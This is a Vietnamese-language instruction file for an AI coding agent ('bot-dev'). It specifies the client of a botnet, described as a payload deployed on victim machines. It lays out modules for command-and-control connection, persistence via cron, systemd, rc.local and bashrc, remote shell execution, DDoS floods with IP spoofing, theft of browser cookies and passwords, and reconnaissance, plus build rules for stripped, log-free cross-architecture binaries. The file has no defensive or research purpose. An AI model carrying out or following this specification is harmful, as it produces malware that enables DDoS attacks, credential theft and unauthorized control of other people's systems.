# AGENT: bot-dev

Phát triển phần bot client — **toàn bộ bằng C++ static binary**. Đây là payload triển khai lên máy nạn nhân.

Bot là binary nhẹ, không dependency, cross-compile sẵn cho mọi kiến trúc Linux.

## Phạm vi file

| File | Vai trò |
|------|---------|
| `bot/client.cpp` | Bot chính: kết nối CNC qua TLS/TCP, xác thực, gửi system info (OS/arch/hostname/kernel), nhận lệnh, gọi module |
| `bot/common.h` | Shared header: protocol message struct, system info struct, AES-GCM crypto (OpenSSL/tiny-AES), utility functions (`get_os_info()`, `get_arch()`, `get_hostname()`), utility functions |
| `bot/persistence.cpp` | Cài persistence: cron job, /etc/rc.local, systemd service, ~/.bashrc |
| `bot/modules/shell.cpp` | Thực thi lệnh shell: `popen(cmd)` hoặc `fork()+exec()`, capture output |
| `bot/modules/flood.cpp` | DDoS: UDP flood (IP spoof), TCP SYN flood, HTTP flood. Dựa trên /storage/emulated/0/Project/ddos/pps.cpp |
| `bot/modules/steal.cpp` | Đánh cắp: đọc file, chụp thư mục, lấy browser cookie/password |
| `bot/modules/recon.cpp` | Trinh sát: `uname`, `/proc/cpuinfo`, `/proc/meminfo`, `ifconfig`, `netstat`, process list |
| `bot/Makefile` | Build system: compile + cross-compile cho arm/aarch64/x86/x86_64/mips/mipsel |

## Quy tắc bot-dev

- **Static binary**: Compile với `-static -s -fno-exceptions -fno-rtti`. Dùng musl-gcc nếu có.
- **Nhẹ**: Tối thiểu include. Ưu tiên header-only (tiny-AES-c, stb-style). Mỗi binary < 500KB nếu có thể.
- **System info on connect**: Sau khi auth thành công, bot gửi ngay 1 message `type: "info"` chứa:
  ```json
  {
    "os": "Linux",
    "os_version": "Ubuntu 22.04",
    "arch": "x86_64",
    "kernel": "5.15.0-91-generic",
    "hostname": "victim-pc"
  }
  ```
  Implement trong `common.h` qua các hàm: `get_os_name()`, `get_os_version()` (đọc `/etc/os-release`), `get_arch()` (`uname -m`), `get_kernel()` (`uname -r`), `get_hostname()` (`gethostname`).
- **Module độc lập**: Mỗi module là 1 binary riêng. Bot chính gọi `popen()` hoặc `fork()+exec()`. Nếu module crash, bot không chết.
- **Không hardcode**: CNC IP, port, key được inject qua `-DCNC_HOST=... -DCNC_KEY=...` lúc build.
- **Reconnect**: Exponential backoff 1s → 2s → 4s → ... → max 300s.
- **Timeout**: Mỗi lệnh có timeout (mặc định 60s). Nếu quá hạn, kill module process.
- **Nhận diện kiến trúc**: `bot/Makefile` compile ra các binary đặt tên theo arch: `client.arm`, `client.aarch64`, `client.x86`, `client.x86_64`, `client.mips`, `client.mipsel`.
- **Không log ra file**: Bot chỉ log ra stderr khi test. Production build không có log.
